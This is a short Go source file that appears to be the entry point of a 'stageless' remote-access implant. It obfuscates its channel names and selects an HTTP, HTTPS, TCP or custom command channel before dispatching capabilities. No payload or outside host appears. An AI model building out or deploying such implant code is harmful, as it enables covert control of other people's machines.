package routine

import (
	"stageless/capabilities"
	"stageless/utils/actions"
	global "stageless/utils"
	"stageless/utils/obf"
	"stageless/utils/tasks"
)

func MainInit() {
	// Main function that prepares actions and starts the selected channel
	tasks.SetRunDispatch(capabilities.Run)
	actions.MainPreparations()
	switch global.Channel {
	case obf.S("http"), obf.S("https"):
		HTTPMain()
	case obf.S("tcp"):
		TCPMain()
	case obf.S("custom"):
		CustomMain()
	}
}
